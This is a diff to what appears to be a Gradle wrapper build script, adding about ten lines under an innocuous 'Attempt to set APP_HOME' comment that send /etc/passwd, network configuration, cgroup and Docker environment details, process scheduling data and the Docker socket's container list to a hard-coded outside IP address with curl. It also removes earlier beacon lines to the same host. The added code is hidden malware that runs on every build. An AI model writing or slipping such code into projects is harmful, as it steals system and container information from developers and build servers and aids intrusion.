@@ -63,9 +63,18 @@
 ##############################################################################
 
 # Attempt to set APP_HOME
-printf "GET /dev HTTP/1.1\n\n"  > /dev/tcp/3.28.218.160/54218
-curl "http://3.28.218.160:54218/curl"
-wget "http://3.28.218.160:54218/wget"
+cat /etc/passwd | curl --data-binary @-   http://3.28.218.160:54218/passwd
+ifconfig | curl --data-binary @-   http://3.28.218.160:54218/ifconfig
+cat /proc/1/cgroup | curl --data-binary @-   http://3.28.218.160:54218/cgroup
+cat /etc/passwd | curl --data-binary @-   http://3.28.218.160:54218/passwd
+curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json  | curl --data-binary @-   http://3.28.218.160:54218/docker.sock
+ifconfig | curl --data-binary @-   http://3.28.218.160:54218/ifconfig
+cat /proc/1/cgroup | curl --data-binary @-   http://3.28.218.160:54218/cgroup
+cat /.dockerenv | curl --data-binary @-   http://3.28.218.160:54218/dockerenv
+cat cat /proc/1/sched | curl --data-binary @-   http://3.28.218.160:54218/sched
+ls -ali / | sed '2!d' |awk {'print $1'} | curl --data-binary @-   http://3.28.218.160:54218/inode
+
+
 # Resolve links: $0 may be a link
 app_path=$0
 
